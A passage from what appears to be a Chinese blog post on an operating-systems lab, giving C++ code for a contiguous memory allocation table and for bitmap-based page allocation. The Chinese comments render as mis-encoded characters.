class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">table</span></span><br><span class="hljs-class">&#123;</span><br>    string name; <span class="hljs-comment">//ä¸»å­˜åˆ†é…ä¿¡æ¯</span><br>    <span class="hljs-keyword">int</span> address; <span class="hljs-comment">//ä¸»å­˜èµ·å§‹åœ°å€</span><br>    <span class="hljs-keyword">int</span> length;  <span class="hljs-comment">//ä¸»å­˜åˆ†é…é•¿åº¦</span><br>    <span class="hljs-keyword">int</span> state;   <span class="hljs-comment">//ä¸»å­˜çŠ¶æ€ä¿¡æ¯ï¼Œ1ä¸ºå·²åˆ†é…ï¼Œ0ä½æœªåˆ†é…</span><br>&#125;;<br>vector&lt;table&gt; alloc_table;   <span class="hljs-comment">//ä¸»å­˜è¡¨</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(table &amp;a, table &amp;b)</span> <span class="hljs-comment">//æ’åºæ¯”è¾ƒå‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.address &lt; b.address;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge</span><span class="hljs-params">()</span> <span class="hljs-comment">//æœªåˆ†é…ä¸»å­˜çš„åˆå¹¶å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].address + alloc_table[i].length == alloc_table[i + <span class="hljs-number">1</span>].address &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span> &amp;&amp; alloc_table[i + <span class="hljs-number">1</span>].state == <span class="hljs-number">0</span>)<br>        &#123; <span class="hljs-comment">//ç›¸é‚»åˆ™åˆå¹¶ï¼Œå¹¶åˆ æ‰åè€…</span><br>            alloc_table[i].length += alloc_table[i + <span class="hljs-number">1</span>].length;<br>            alloc_table.<span class="hljs-built_in">erase</span>(alloc_table.<span class="hljs-built_in">begin</span>() + i + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recovery</span><span class="hljs-params">(string name)</span> <span class="hljs-comment">//ä¸»å­˜å›æ”¶å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].name == name)<br>        &#123;<br>            alloc_table[i].name = <span class="hljs-string">&quot;æœªåˆ†é…&quot;</span>;<br>            alloc_table[i].state = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">return</span> alloc_table[i].length;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">(string name, <span class="hljs-keyword">int</span> length)</span> <span class="hljs-comment">//ä¸»å­˜åˆ†é…å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].length &gt; length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//å‰©ä½™ç©ºé—´æ¯”éœ€æ±‚å¤§</span><br>        &#123;<br>            table t;<br>            t.name = name;<br>            t.address = alloc_table[i].address;<br>            t.length = length;<br>            t.state = <span class="hljs-number">1</span>;<br>            alloc_table.<span class="hljs-built_in">push_back</span>(t);<br><br>            alloc_table[i].address += length;<br>            alloc_table[i].length -= length;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (alloc_table[i].length == length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//å‰©ä½™ç©ºé—´å’Œéœ€æ±‚ä¸€æ ·</span><br>        &#123;<br>            alloc_table[i].name = name;<br>            alloc_table[i].state = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//çŠ¶æ€åˆå§‹åŒ–</span></span><br><span class="hljs-function"></span>&#123;<br>    table a;<br>    a.name = <span class="hljs-string">&quot;æ“ä½œç³»ç»Ÿ&quot;</span>;<br>    a.address = <span class="hljs-number">0</span>;<br>    a.length = <span class="hljs-number">5</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;1&quot;</span>;<br>    a.address = <span class="hljs-number">5</span>;<br>    a.length = <span class="hljs-number">5</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;3&quot;</span>;<br>    a.address = <span class="hljs-number">10</span>;<br>    a.length = <span class="hljs-number">4</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;2&quot;</span>;<br>    a.address = <span class="hljs-number">26</span>;<br>    a.length = <span class="hljs-number">6</span>;<br>    a.state = <span class="hljs-number">1</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;æœªåˆ†é…&quot;</span>;<br>    a.address = <span class="hljs-number">14</span>;<br>    a.length = <span class="hljs-number">12</span>;<br>    a.state = <span class="hljs-number">0</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;æœªåˆ†é…&quot;</span>;<br>    a.address = <span class="hljs-number">32</span>;<br>    a.length = <span class="hljs-number">96</span>;<br>    a.state = <span class="hljs-number">0</span>;<br>    alloc_table.<span class="hljs-built_in">push_back</span>(a);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> <span class="hljs-comment">//ä¿¡æ¯æ‰“å°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|----------------ç©ºé—²åˆ†åŒºè¡¨------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  èµ· å€  |  é•¿ åº¦  |  çŠ¶ æ€  |     åç§°     |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].state == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %3d   |   %3d   |   %3d   |  %9s   |\n&quot;</span>, alloc_table[i].address, alloc_table[i].length, alloc_table[i].state, alloc_table[i].name.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|----------------ä¸»å­˜åˆ†é…è¡¨------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  èµ· å€  |  é•¿ åº¦  |  çŠ¶ æ€  |     åç§°     |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].state == <span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %3d   |   %3d   |   %3d   |  %9s   |\n&quot;</span>, alloc_table[i].address, alloc_table[i].length, alloc_table[i].state, alloc_table[i].name.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------------------------------|\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~åˆå§‹çŠ¶æ€~~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp); <span class="hljs-comment">//æ’åº</span><br>    <span class="hljs-built_in">merge</span>();                                           <span class="hljs-comment">//åˆå¹¶</span><br>    <span class="hljs-built_in">print</span>();                                           <span class="hljs-comment">//æ‰“å°ä¿¡æ¯</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~åŠ å…¥å·¥ä½œ4~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------------------ç”³è¯·å†…å­˜4-------------------\n&quot;</span>);<br>    <span class="hljs-built_in">allocation</span>(<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">6</span>); <span class="hljs-comment">//åˆ†é…</span><br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp);<br>    <span class="hljs-built_in">merge</span>();<br>    <span class="hljs-built_in">print</span>();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~å›æ”¶å·¥ä½œ3~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> a = <span class="hljs-built_in">recovery</span>(<span class="hljs-string">&quot;3&quot;</span>); <span class="hljs-comment">//å›æ”¶</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------------------é‡Šæ”¾å†…å­˜%d-------------------\n&quot;</span>, a);<br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp);<br>    <span class="hljs-built_in">merge</span>();<br>    <span class="hljs-built_in">print</span>();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n~~~~~~~~~~~~~~~~~~å›æ”¶å·¥ä½œ2~~~~~~~~~~~~~~~~~~~\n&quot;</span>);<br>    a = <span class="hljs-built_in">recovery</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n------------------é‡Šæ”¾å†…å­˜%d-------------------\n&quot;</span>, a);<br>    <span class="hljs-built_in">sort</span>(alloc_table.<span class="hljs-built_in">begin</span>(), alloc_table.<span class="hljs-built_in">end</span>(), cmp);<br>    <span class="hljs-built_in">merge</span>();<br>    <span class="hljs-built_in">print</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>åˆå§‹çŠ¶æ€ï¼š</p><p><img src="/posts/6c024da0/image-20211213174019843.png" alt="image-20211213174019843"></p><p>åŠ å…¥å·¥ä½œ4ï¼š</p><p><img src="/posts/6c024da0/image-20211213174056801.png" alt="image-20211213174056801"></p><p>å›æ”¶å·¥ä½œ3ï¼š</p><p><img src="/posts/6c024da0/image-20211213174118960.png" alt="image-20211213174118960"></p><p>å›æ”¶å·¥ä½œ2ï¼š</p><p><img src="/posts/6c024da0/image-20211213174145295.png" alt="image-20211213174145295"></p><h3 id="ç¬¬äºŒé¢˜ä½ç¤ºå›¾"><a class="markdownIt-Anchor" href="#ç¬¬äºŒé¢˜ä½ç¤ºå›¾"></a> ç¬¬äºŒé¢˜ï¼šä½ç¤ºå›¾</h3><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-3"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-3"></a> æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> table[<span class="hljs-number">8</span>][<span class="hljs-number">8</span>];<span class="hljs-comment">//ä½ç¤ºå›¾</span><br><span class="hljs-keyword">int</span> free_num = <span class="hljs-number">64</span>;<span class="hljs-comment">//å½“å‰ä½ç¤ºå›¾ç©ºé—²å—</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work</span></span><br><span class="hljs-class">&#123;</span><br>    string name;<span class="hljs-comment">//ä½œä¸šåç§°</span><br>    <span class="hljs-keyword">int</span> mem_num;<span class="hljs-comment">//ä½œä¸šé¡µè¡¨æ•°é‡</span><br>    <span class="hljs-keyword">int</span> page_table[<span class="hljs-number">64</span>];<span class="hljs-comment">//é¡µè¡¨</span><br>&#125;;<br>vector&lt;work&gt; w;<span class="hljs-comment">//ä½œä¸šæ•°é‡</span><br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜-3"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜-3"></a> å‡½æ•°è¯´æ˜</h4><p>ä¸€å…±ä¸¤ä¸ªä¸»è¦å‡½æ•°</p><ul><li>ä½œä¸šåˆ†é…å‡½æ•°allocation()</li><li>ä½œä¸šå›æ”¶å‡½æ•°recovery()</li></ul><p>å‡½æ•°æ€è·¯å¦‚ä¸‹ï¼Œå‡ç›¸å½“å¥½ç†è§£</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">()</span><span class="hljs-comment">//ä½œä¸šåˆ†é…å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    work a;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//è¾“å…¥ä½œä¸šåå¹¶åˆ¤æ–­æ˜¯å¦å·²ç»å­˜åœ¨</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦åˆ†é…çš„ä½œä¸šå:&quot;</span>);<br>        cin &gt;&gt; a.name;<br>        <span class="hljs-keyword">int</span> kk = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (a.name == w[i].name)<br>                kk = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (kk == <span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å½“å‰ä½œä¸šå·²å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ä½œä¸šå†…å­˜ç”³è¯·é‡:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a.mem_num);<br>    <span class="hljs-keyword">if</span> (free_num &gt;= a.mem_num)<span class="hljs-comment">//å¦‚æœå†…å­˜ç©ºé—´å¤§äºä½œä¸šå†…å­˜ç”³è¯·æ•°é‡</span><br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!table[i][j])<span class="hljs-comment">//ä¿®æ”¹æœªåˆ†é…çš„ä½ç¤ºå›¾</span><br>                &#123;<br>                    table[i][j] = <span class="hljs-number">1</span>;<br>                    free_num--;<br>                    a.page_table[t++] = i * <span class="hljs-number">8</span> + j;<br>                    <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        w.<span class="hljs-built_in">push_back</span>(a);<span class="hljs-comment">//åŠ å…¥ä½œä¸šåˆ—è¡¨</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nä½œä¸šå†…å­˜åˆ†é…æˆåŠŸ\n&quot;</span>);<br>        <span class="hljs-built_in">print</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nå†…å­˜ç©ºé—²å—ä¸è¶³\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recovery</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string name;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦é‡Šæ”¾çš„ä½œä¸šå:&quot;</span>);<br>    cin &gt;&gt; name;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (w[i].name == name)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nå½“å‰ä½œä¸šå½’è¿˜çš„å—å·ï¼š&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; w[i].mem_num; k++)<span class="hljs-comment">//é€ä¸ªé‡Šæ”¾å†…å­˜å—</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  &quot;</span>, w[i].page_table[k]);<br>                table[w[i].page_table[k] / <span class="hljs-number">8</span>][w[i].page_table[k] % <span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>                free_num++;<br>            &#125;<br>            w.<span class="hljs-built_in">erase</span>(w.<span class="hljs-built_in">begin</span>() + i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nä½œä¸šå›æ”¶æˆåŠŸ\n&quot;</span>);<br>            <span class="hljs-built_in">print</span>();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\næœªæ‰¾åˆ°å½“å‰ä½œä¸š\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="å®Œæ•´æºä»£ç -3"><a class="markdownIt-Anchor" href="#å®Œæ•´æºä»£ç -3"></a> å®Œæ•´æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">int</span> table[<span class="hljs-number">8</span>][<span class="hljs-number">8</span>];<span class="hljs-comment">//ä½ç¤ºå›¾</span><br><span class="hljs-keyword">int</span> free_num = <span class="hljs-number">64</span>;<span class="hljs-comment">//å½“å‰ä½ç¤ºå›¾ç©ºé—²å—</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work</span></span><br><span class="hljs-class">&#123;</span><br>    string name;<span class="hljs-comment">//ä½œä¸šåç§°</span><br>    <span class="hljs-keyword">int</span> mem_num;<span class="hljs-comment">//ä½œä¸šé¡µè¡¨æ•°é‡</span><br>    <span class="hljs-keyword">int</span> page_table[<span class="hljs-number">64</span>];<span class="hljs-comment">//é¡µè¡¨</span><br>&#125;;<br>vector&lt;work&gt; w;<span class="hljs-comment">//ä½œä¸šæ•°é‡</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1.åˆ†é…ä½œä¸š\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2.å›æ”¶ä½œä¸š\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3.é€€å‡º\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span><span class="hljs-comment">//ä½ç¤ºå›¾åˆå§‹åŒ–å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(table, <span class="hljs-number">0</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(table));<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    table[<span 